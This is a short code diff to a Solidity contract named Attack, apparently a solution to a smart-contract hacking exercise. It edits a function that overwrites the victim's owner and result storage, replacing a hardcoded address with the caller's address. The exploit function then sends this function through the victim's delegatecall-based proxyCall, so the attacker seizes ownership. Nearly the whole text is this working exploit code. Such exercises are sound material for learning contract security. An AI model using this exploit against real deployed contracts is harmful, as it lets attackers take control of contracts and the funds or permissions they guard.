@@ -23,11 +23,9 @@ contract Attack {
     }
 
     // NOTE: You might need some malicious function here
-    function none() external {}
-
-    function malicious() external {
-        owner = 0xa63c492D8E9eDE5476CA377797Fe1dC90eEAE7fE;
-        result[0xa63c492D8E9eDE5476CA377797Fe1dC90eEAE7fE] = true;
+    function malicious(address hacker) external {
+        owner = hacker;
+        result[hacker] = true;
     }
 
     function exploit() external {
@@ -35,6 +33,6 @@ contract Attack {
         // Note: Make sure you know how delegatecall works
         // bytes memory data = ...
 
-        ID31eg4t3(victim).proxyCall(abi.encodeWithSignature("malicious()"));
+        ID31eg4t3(victim).proxyCall(abi.encodeWithSignature("malicious(address)", msg.sender));
     }
 }
